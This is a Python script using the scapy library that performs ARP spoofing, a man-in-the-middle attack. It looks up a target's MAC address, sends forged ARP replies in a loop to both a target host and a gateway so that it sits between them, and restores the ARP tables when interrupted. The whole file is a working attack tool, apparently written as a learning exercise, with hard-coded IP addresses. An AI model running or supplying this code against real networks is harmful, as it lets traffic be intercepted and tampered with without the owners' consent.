#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]

    print("IP\t\t\t\tMAC Address\n-------------------------------")
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac_address = get_mac_address(destination_ip)
    source_mac_address = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
                       hwsrc=source_mac_address)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.1"
gateway_ip = "192.168.163.2"

try:
    sent_packets_count = 0
    while True:
        spoof("192.168.1.1", "192.168.163.2")
        spoof("192.168.163.2", "192.168.1.1")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent" + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP Tables...Please Wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
